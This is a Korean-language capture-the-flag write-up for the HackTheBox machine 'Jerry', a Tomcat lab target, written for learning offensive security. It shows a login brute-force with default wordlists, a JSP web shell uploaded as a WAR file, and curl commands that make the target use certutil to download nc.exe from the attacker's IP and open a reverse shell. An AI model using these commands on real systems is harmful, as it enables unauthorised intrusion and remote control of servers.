# Jerry - HackTheBox
## Recon
```bash
sudo nmap -p 8080 -sC -sV -vv -oA Jerry 10.10.10.95
```
<img width="1104" height="146" alt="image" src="https://github.com/user-attachments/assets/a79312a3-65ea-40d2-9c1f-34eab5042f73" />

- HTTP(80)

---
## HTTP
- Apache Tomcat 7.0.88
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/ead26098-3b5b-4bb7-b381-c02fd0a69e6c" />

<br>
<br>

- 로그인 계정을 알 수 없어서 브루트포스 공격 시도.
- `tomcat:s3cret`을 알아냄.
```bash
git clone https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

python3 mgr_brute.py -U http://10.10.10.95:8080/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
<img width="1104" height="206" alt="image" src="https://github.com/user-attachments/assets/7465b8e0-d23a-4737-8195-8cba29884352" />

---
## RCE
- `Manager App`에 발견한 로그인 계정으로 접속하여 `war`파일 업로드가 가능하다는 것을 확인
- 웹셸을 압축하여 `war`파일로 생성.
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
<img width="1104" height="361" alt="image" src="https://github.com/user-attachments/assets/73962756-25c7-42da-bedb-6ddb6d9ba932" />

<br>
<br>

- 웹셸 업로드.
<img width="1100" height="61" alt="image" src="https://github.com/user-attachments/assets/10a2bbf7-2750-4608-9748-6be333336e30" />

<br>
<br>

- 웹셸 접속 시도.
```bash
curl 'http://10.10.10.95:8080/backup/cmd.jsp?cmd=whoami'
```
<img width="611" height="322" alt="image" src="https://github.com/user-attachments/assets/7531d6ff-429c-4f8e-bbf2-57b383cf5b66" />

<br>
<br>

- 리버스 셸 연결 시도
```
curl 'http://10.10.10.95:8080/backup/cmd.jsp?cmd=certutil%20-urlcache%20-f%20-split%20http%3A%2F%2F10.10.16.4%2Fnc.exe%20c%3A%5Cwindows%5Ctemp%5Cnc.exe'

curl 'http://10.10.10.95:8080/backup/cmd.jsp?cmd=c%3A%5Cwindows%5Ctemp%5Cnc.exe%2010.10.16.4%2080%20-e%20cmd.exe'
```
<img width="1104" height="514" alt="image" src="https://github.com/user-attachments/assets/88729fdd-7478-4fc7-9240-8d75a0bb7439" />

<br>
<br>

- 셸 획득.
<img width="1104" height="208" alt="image" src="https://github.com/user-attachments/assets/0d9f5feb-ae7f-46bc-aba6-81d9f3e2f8f6" />

---
## FLAG
- `c:\users\administrator\desktop\flags\2 for the price of 1.txt`
<img width="1104" height="245" alt="image" src="https://github.com/user-attachments/assets/d09ea54c-75fd-4ea4-a02e-f3eeea6da22c" />

